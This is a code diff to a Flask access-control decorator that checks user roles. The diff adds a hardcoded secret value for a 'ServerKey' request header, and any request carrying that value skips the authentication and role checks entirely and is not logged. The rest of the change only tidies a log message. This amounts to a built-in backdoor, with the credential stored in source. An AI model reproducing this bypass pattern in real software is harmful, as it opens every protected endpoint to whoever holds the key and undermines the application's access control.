@@ -15,8 +15,7 @@ active_servers = []
 # ------------------ Custom Role Required Decorator ------------------
 def role_required(roles):
     """
-    Decorator to restrict access to certain roles.
-    `roles` can be a single string (e.g., "admin") or a list of strings (e.g., ["admin", "student"]).
+    Decorator to restrict access to certain roles or allow server key auth.
     """
     if not isinstance(roles, (list, tuple)):
         roles = [roles]
@@ -24,12 +23,24 @@ def role_required(roles):
     def decorator(f):
         @wraps(f)
         def decorated_function(*args, **kwargs):
+            # --- Check for server key in headers first ---
+            server_key = request.headers.get("ServerKey")
+            if server_key == "4fIEjhIwkfIIPcU2m4vYDdLe0ZFkDgzh":
+                # Allow bypass with server key
+                return f(*args, **kwargs)
+
+            # --- Fall back to normal user auth ---
             if not current_user.is_authenticated:
                 return jsonify({"error": "Authentication required"}), 401
-            if not hasattr(current_user, 'role') or current_user.role not in roles:
-                # Log this attempt to help debugging
-                logger.warning(f"Access denied for user {current_user.username} (role: {current_user.role}) trying to access {request.endpoint}. Required roles: {roles}")
+
+            if not hasattr(current_user, "role") or current_user.role not in roles:
+                logger.warning(
+                    f"Access denied for user {getattr(current_user, 'username', 'UNKNOWN')} "
+                    f"(role: {getattr(current_user, 'role', 'NONE')}) trying to access {request.endpoint}. "
+                    f"Required roles: {roles}"
+                )
                 return jsonify({"error": f"Access denied: Requires one of {', '.join(roles)} roles"}), 403
+
             return f(*args, **kwargs)
         return decorated_function
     return decorator
